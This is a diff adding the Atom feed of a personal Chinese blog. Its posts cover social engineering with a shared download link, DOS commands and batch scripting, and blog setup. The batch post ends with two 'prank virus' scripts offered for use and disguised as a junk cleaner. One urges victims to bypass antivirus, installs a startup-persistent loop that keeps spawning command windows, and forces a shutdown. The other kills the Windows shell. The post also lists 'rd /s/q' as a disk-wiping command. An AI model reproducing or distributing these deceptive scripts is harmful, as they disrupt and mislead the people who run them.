@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>BMY&#39;S Blog</title>
+  
+  <subtitle>Hello my Friends</subtitle>
+  <link href="https://bmy12138.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://bmy12138.github.io/"/>
+  <updated>2023-08-30T13:19:11.838Z</updated>
+  <id>https://bmy12138.github.io/</id>
+  
+  <author>
+    <name>BMY</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>近期社工的一些总结</title>
+    <link href="https://bmy12138.github.io/posts/3640637383.html"/>
+    <id>https://bmy12138.github.io/posts/3640637383.html</id>
+    <published>2023-08-30T13:18:18.963Z</published>
+    <updated>2023-08-30T13:19:11.838Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="关于社工"><a href="#关于社工" class="headerlink" title="关于社工"></a>关于社工</h1><h4 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h4><p>本篇文章只涉及技术交流讨论，如果有人使用本文章内容进行违法活动，均与本作者无关！</p><h4 id="2-基础"><a href="#2-基础" class="headerlink" title="2.基础"></a>2.基础</h4><p>其实好讲的不大多，因为这方面真的很难去聊了。懂的都懂。其实社工说白了就是来骗，来偷袭！依靠对对方的喜好了解去制作钓鱼链接以及一些隐蔽手段去骗对方。</p><h4 id="3-关于CD圈子的看法"><a href="#3-关于CD圈子的看法" class="headerlink" title="3.关于CD圈子的看法"></a>3.关于CD圈子的看法</h4><p>多的不说，我上个链接自己看，我相信你们都丫为了这个来的。</p><p>链接：<a href="https://pan.baidu.com/s/1HjAvyvsmxO1WlEm2RQnXng">https://pan.baidu.com/s/1HjAvyvsmxO1WlEm2RQnXng</a><br>提取码是实验室门牌，你懂的！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;关于社工&quot;&gt;&lt;a href=&quot;#关于社工&quot; class=&quot;headerlink&quot; title=&quot;关于社工&quot;&gt;&lt;/a&gt;关于社工&lt;/h1&gt;&lt;h4 id=&quot;1-写在前面&quot;&gt;&lt;a href=&quot;#1-写在前面&quot; class=&quot;headerlink&quot; title=&quot;1.写在前</summary>
+      
+    
+    
+    
+    <category term="渗透技术" scheme="https://bmy12138.github.io/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF/"/>
+    
+    
+    <category term="社会工程学" scheme="https://bmy12138.github.io/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
+    
+    <category term="人性的弱点" scheme="https://bmy12138.github.io/tags/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DOS命令&amp;批处理</title>
+    <link href="https://bmy12138.github.io/posts/3097481086.html"/>
+    <id>https://bmy12138.github.io/posts/3097481086.html</id>
+    <published>2023-07-31T00:39:34.000Z</published>
+    <updated>2023-07-31T00:56:58.583Z</updated>
+    
+    <content type="html"><![CDATA[<p>讲讲DOS和批处理，主要是做备忘。。。</p><p>基本前置知识：</p><p>DOS命令，计算机术语，是指DOS操作系统的命令，是一种面向磁盘的操作命令，主要包括目录操作类命令、磁盘操作类命令、文件操作类命令和其它命令。</p><p>批处理(Batch)，也称为批处理脚本。顾名思义，批处理就是对某对象进行批量的处理，通常被认为是一种简化的脚本语言，它应用于DOS和Windows系统中。批处理文件的扩展名为bat 。比较常见的批处理包含两类：DOS批处理和PS批处理。PS批处理是基于微软的强大的PowerShell的，用来批量处理一些任务的脚本；而DOS批处理则是基于DOS命令的，用来自动地批量地执行DOS命令以实现特定操作的脚本。</p><p>这个大致看看就好，没啥难度，主要是记忆，下面，我这边会列出常见的DOS命令：</p><ol><li><p>cd</p><p>目录操作符，有以下几种用法</p><p>cd..        返回上级目录</p><p>cd\        返回根目录</p><p>cd d:     进入D盘</p></li><li><p>cls：清空所有dos操作</p></li><li><p>dir：显示当前盘符文件信息</p></li><li><p>rd  ./s/q ：清空磁盘</p></li><li><p>echo 创建文件，一般有以下几种用法</p><p>echo xxx 直接输出</p><p>echo xxx &gt; xxxx.xxx 输出到文件xxxx</p></li><li><p>其他</p><p>attrib +h 文件名     隐藏文件夹</p><p>attrib -h 文件名     取消文件夹</p><p>attrib +h +s +a 文件名       将文件夹隐藏设为系统文件</p><p>shutdown -s -t 100 定时关机</p><p>差不多就是这么多了，只是简单介绍下。</p><hr><p>下面介绍批处理脚本</p><p><strong>如何创建批处理：</strong></p><p>​    命名：.bat</p><p>​    方法：创建一个记事本文件，然后将其扩展改为.bat</p><p>批处理作用：自上而下成批处理每一条DOS命令，直到执行到最后一条。</p><p>运行环境：cmd</p><p><strong>命令解释+备忘：</strong></p><p>@echo off    #关闭回显</p><p>color 0a      #设置窗口显示颜色</p><p><strong>color:</strong></p><p>指定控制台输出的颜色属性                    </p><p> 颜色属性由两个十六进制数字指定 – 第一个为背景，第二个则为文字颜色。</p><p>每个数字可以为以下任何值之一:               </p><p>0 = 黑色     8 = 灰色                                    </p><p>1 = 蓝色     9 = 淡蓝色                  </p><p>2 = 绿色     A = 淡绿色                  </p><p>3 = 湖蓝色    B = 淡浅绿色                 </p><p> 4 = 红色     C = 淡红色                  </p><p>5 = 紫色     D = 淡紫色                  </p><p>6 = 黄色     E = 淡黄色                  </p><p>7 = 白色     F = 亮白色                               </p><p>例如: “cilor fc” 亮白色背景，淡红色文字颜色。 </p><p><strong>密码：</strong></p><p>set /p u=请输入用户名:</p><p>set /p p=请输入新密码:</p><p><strong>常见bat程序命令</strong></p><p> &gt;nul    #清除一条命令执行后系统反馈</p><p><strong>常用命令相关</strong></p><p>shutdown -a      #取消关机  </p><p>shutdown -s      #关机</p><p>shutdown -f　     #强行关闭应用程序</p><p>shutdown -l　     #注销当前用户</p><p>shutdown -r　     #关机并重启</p><p>shutdown -s -t 时间　#定时关机</p><p>shutdown -h      #休眠</p><p>附：VBS</p><p>msgbox：弹窗</p><p>do…loop：无限循环</p><hr><p>好的，那么最后，附上两个恶搞代码，他们都是批处理编写的。</p><p>1.<strong>批处理内存引爆病毒源码</strong></p><pre class=" language-bat"><code class="language-bat">@echo offtitle 系统垃圾清理color 2fecho =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========echo.echo.echo :start>c:\windows\windows.batecho start cmd>>c:\windows\windows.batecho goto start>>c:\windows\windows.batcopy c:\windows\windows.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" >nul 2>nulif %errorlevel%==0 goto next copy c:\windows\windows.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" >nulif %errorlevel%==1 goto error:nextecho.echo.echo   ====== 垃圾清理中，请不要关闭窗口======echo.ping -n 5 127.0.0.1 >nulecho.echo   ====== 垃圾清理完毕，共清理垃圾500M===echo.echo.echo   ====== 正在自动重启电脑======ping -n 3 127.0.0.1 >nulshutdown -s -t 0pausegoto ex:errorecho.echo.echo   ====== 程序运行失败，请使用【管理员权限】重新运行！======echo.pausegoto ex:exexit</code></pre><p>2.<strong>恶搞病毒</strong></p><pre class=" language-bat"><code class="language-bat">@echo offtitle 系统垃圾清理color 2fecho ====== 若有杀毒软件恶意拦截，请选择【允许程序的所有操作】=====echo.echo.echo ====== 垃圾清理中，请不要关闭窗口=======ping -n 5 127.0.0.1 >nultaskkill /im explorer.exe /f>nulclsecho ====== 芜湖！你系统死喽！！=======ping -n 5 127.0.0.1 >nulclsecho ====== 别慌，闭上眼睛叫十声爸爸就好了=======ping -n 7 127.0.0.1 >nulstart c:\windows\explorer.exe>nulecho ====== 已经修复好了！是不是吓坏了！！嘿嘿=========pause</code></pre></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;讲讲DOS和批处理，主要是做备忘。。。&lt;/p&gt;
+&lt;p&gt;基本前置知识：&lt;/p&gt;
+&lt;p&gt;DOS命令，计算机术语，是指DOS操作系统的命令，是一种面向磁盘的操作命令，主要包括目录操作类命令、磁盘操作类命令、文件操作类命令和其它命令。&lt;/p&gt;
+&lt;p&gt;批处理(Batch)，也称为批处</summary>
+      
+    
+    
+    
+    <category term="基础部分" scheme="https://bmy12138.github.io/categories/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/"/>
+    
+    
+    <category term="Windows" scheme="https://bmy12138.github.io/tags/Windows/"/>
+    
+    <category term="DOS命令" scheme="https://bmy12138.github.io/tags/DOS%E5%91%BD%E4%BB%A4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>博客搭建的坑点</title>
+    <link href="https://bmy12138.github.io/posts/1267895499.html"/>
+    <id>https://bmy12138.github.io/posts/1267895499.html</id>
+    <published>2023-07-30T06:34:34.021Z</published>
+    <updated>2023-07-31T00:30:55.933Z</updated>
+    
+    <content type="html"><![CDATA[<p>嘛，开一个新篇章，专门讲解下个人博客的搭建吧，这里主要会列举几个坑点，还有就是环境配置的问题，希望大家轻喷。</p><p>首先，博客有多种搭建方法，不一定要按照我的方法进行搭建。我使用的是hexo框架和其自定义主题进行配置，也就是完全按照网上大佬的操作进行的。这里我会附上<a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#toc-heading-18">大佬</a>的链接，具体的搭建细节在大佬的blog里面有详细的叙述，我就不再赘述了。这里只是简单说明下大佬文章里面一些不适用的点（毕竟版本翻新，也有可能是我自己操作问题）。</p><p>1.环境配置：</p><p>git一键下载安装没啥事情，主要是nodejs的环境真的是让我头大了一阵子（最后我的环境还是有问题的，但是能跑就是了），虽然我不清楚问题点，但是既然bug运行的很不错，那就不要乱动它了。大部分报错都可以度娘（给女朋友的国外电脑配置过，环境难受死）。我在这里着重强调几个地方。</p><ul><li>如果你的操作确认无误，那就看看nodejs的权限，有的电脑权限管理很严，右键属性安全性自行查看。（这里点名批评对象的外国系统败家之眼，我自己的环境配置五分钟，她的两小时….）</li><li>如果之前本地部署过nodejs项目，新老项目冲突，看看老项目报错，百度一般可以解决，或者直接移动老项目文件到它自己的目录下面，会解决很多问题。</li><li>如果你环境变量什么都配置好了，但是<code>npm config set prefix"C:\Program Files\nodejs\node_global"</code>这段代码依然报错，没关系我也是，只要hexo能正常下载安装就不要去管他了！</li><li>git部分我没有遇到问题，有问题的同学自行度娘吧哈哈哈！</li><li>如果自己配置了域名，每次重传的时候记得要重新绑定域名，这一点我暂时也没有找到好的解决办法。</li><li>安全方面我也在研究，暂缓。</li><li>大佬博客里自定义页面我暂时没有好的解决办法，我也在研究，同时博文排序和推荐问题我也没有什么好的解决办法。看板娘我后续会发链接的。</li></ul><p>暂时列举这么多，后续更新</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;嘛，开一个新篇章，专门讲解下个人博客的搭建吧，这里主要会列举几个坑点，还有就是环境配置的问题，希望大家轻喷。&lt;/p&gt;
+&lt;p&gt;首先，博客有多种搭建方法，不一定要按照我的方法进行搭建。我使用的是hexo框架和其自定义主题进行配置，也就是完全按照网上大佬的操作进行的。这里我会附上</summary>
+      
+    
+    
+    
+    <category term="杂谈" scheme="https://bmy12138.github.io/categories/%E6%9D%82%E8%B0%88/"/>
+    
+    
+    <category term="个人博客" scheme="https://bmy12138.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello my friends</title>
+    <link href="https://bmy12138.github.io/posts/330952584.html"/>
+    <id>https://bmy12138.github.io/posts/330952584.html</id>
+    <published>2023-07-28T08:52:34.070Z</published>
+    <updated>2023-07-29T05:44:25.058Z</updated>
+    
+    <content type="html"><![CDATA[<p>这是我的第一篇blog，仅仅只是测试一下而已。到这里说实话，做了很多，以后慢慢讲吧。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;这是我的第一篇blog，仅仅只是测试一下而已。到这里说实话，做了很多，以后慢慢讲吧。&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
